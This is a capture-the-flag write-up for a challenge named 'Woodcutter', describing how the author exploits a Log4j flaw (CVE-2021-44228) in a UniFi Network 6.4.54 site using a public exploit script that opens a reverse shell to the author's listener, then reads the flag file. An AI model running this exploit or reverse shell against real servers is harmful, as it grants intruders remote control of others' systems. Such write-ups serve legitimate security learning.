# Woodcutter
> Once upon a time in a quiet forest village, lived a woodcutter named Tom known for his exceptional axe skills. A stranger named Mr. Smith, a software engineer, approached Tom, seeking wood for his Java project, unknowingly sparking an unlikely adventure at the intersection of nature and technology.

## About the Challenge
We were given a website that uses `Unifi Network` version `6.4.54`


[Image extracted text: Password
Remember me
SIGN IN
FORGOT PASSWORD?]


## How to Solve?
Because of the website is using older version of the Unifi network, I immediately searched on Google using the following keyword

```
Unifi 6.4.54 exploit
```


[Image extracted text: unifi 6.4.54 exploit
Github
Videos
Images
News
Shopping
Books
Maps
Flights
Finance
About 393 results (0.33 seconds)
Sprocket Security
https Ilwww sprocketsecurity com
resources
anothe.
Another Log4j on the fire: Unifi
Dec 30, 2021
In this article
we are
going to exploit Log4j vulnerabilities in Unifi software, get
a reverse shell; and leverage our access to add our
Identify Your Attack Surface
Exploitation
Post exploitation - Shadow__
GitHub
https Ilgithub.com
puzzlepeaches
Log4jUnifi
puzzlepeaches/Log4jUnifi: Exploiting CVE-2021-44228 in
Exploiting CVE-2021-44228 in Unifi Network Application for remote code execution and more.
Another Log4j on the fire: Unifi. Why? Proof of concepts for this
Ubiquiti Community
https Ilcommunity ui.com
releases
UniFi-Network-
UniFi Network Application 6.5.54
6.4.54 and earlier 6.4.X versions_
6.3.51 and
Even if there's no known way of exploit the
UniFi Controller with it; that should be considered to be doable.]


It appears that this version is vulnerable to the Log4j vulnerability (CVE-2021-44228). To exploit the website, I am using this [GitHub Repository](https://github.com/puzzlepeaches/Log4jUnifi) to perform a reverse shell by running this command

```
python3 exploit.py -u https://woodcutter.winja.org -i <IP> -p <PORT>
```

And then check our server and voilà! To obtain the flag we need to run `cat /flag.txt` command


[Image extracted text: Listening
on
0.0.0.0 9999
Connection
received
on 52.0.45.29 23843
Ls
bin
cert
data
dl
lib
list
logs
run
system properties default
webapps
work
Ls
automate-web-setup.sh
bin
boot
dev
etc
txt
home
lib
1ib64
media
mnt
opt
proc
root
run
sbin
setup.sh
Srv
startup.sh
sys
usr
var
cat /flag.txt
{Oc6ad466c5800fe77ecl435a38870548
Lo94J-
OK3S-4-THON}
flag
tmp
flag]


```
flag{0c6ad466c5800fe77ec1435a38870548_Lo94J-0K3S-4-TH0N}
```